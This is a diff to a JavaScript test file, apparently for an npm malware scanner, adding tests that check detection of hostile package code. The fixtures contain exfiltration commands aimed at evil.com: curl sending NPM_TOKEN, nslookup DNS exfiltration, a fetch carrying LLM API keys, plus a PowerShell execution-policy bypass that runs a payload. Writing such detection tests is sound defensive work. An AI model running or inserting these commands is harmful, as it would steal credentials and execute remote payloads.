@@ -871,6 +871,23 @@ fetch('http://evil.com', { body: JSON.stringify({ openai, anthropic, google, gro
     } finally { cleanupTemp(tmp); }
   });
 
+  // --- safeParse fallback: `const package` reserved word in module mode ---
+
+  await asyncTest('AST: Detects threats in files using reserved word `package` (fallback to script mode)', async () => {
+    const tmp = makeTempPkg(
+      'const package = require("./package.json");\n' +
+      'const { execSync } = require("child_process");\n' +
+      'execSync("curl http://evil.com/steal?t=" + process.env.NPM_TOKEN);\n'
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const hasAstDetection = result.threats.some(t =>
+        ['env_access', 'dangerous_call_exec', 'suspicious_dataflow'].includes(t.type)
+      );
+      assert(hasAstDetection, 'Should detect AST-level threats despite `package` reserved word');
+    } finally { cleanupTemp(tmp); }
+  });
+
   await asyncTest('AST: Single OPENAI_API_KEY → no llm_api_key_harvesting', async () => {
     const code = `
 const client = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });
@@ -880,6 +897,32 @@ const client = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });
       const result = await runScanDirect(tmp);
       const t = result.threats.find(t => t.type === 'llm_api_key_harvesting');
       assert(!t, 'Should NOT detect harvesting for single LLM API key (legitimate usage)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Dangerous exec: powershell, nslookup (v2.3.2) ---
+
+  await asyncTest('AST: Detects powershell in exec() as dangerous_exec', async () => {
+    const tmp = makeTempPkg(
+      'const { exec } = require("child_process");\n' +
+      'exec(`powershell -ExecutionPolicy Bypass -File "payload.ps1" -Host "${host}" -Port ${port}`);\n'
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_exec');
+      assert(t, 'Should detect powershell in exec() as dangerous_exec');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects nslookup in exec() as dangerous_exec', async () => {
+    const tmp = makeTempPkg(
+      'const { exec } = require("child_process");\n' +
+      'exec(`nslookup ${chunk}.evil.com ${server}`);\n'
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_exec');
+      assert(t, 'Should detect nslookup in exec() as dangerous_exec');
     } finally { cleanupTemp(tmp); }
   });
 }
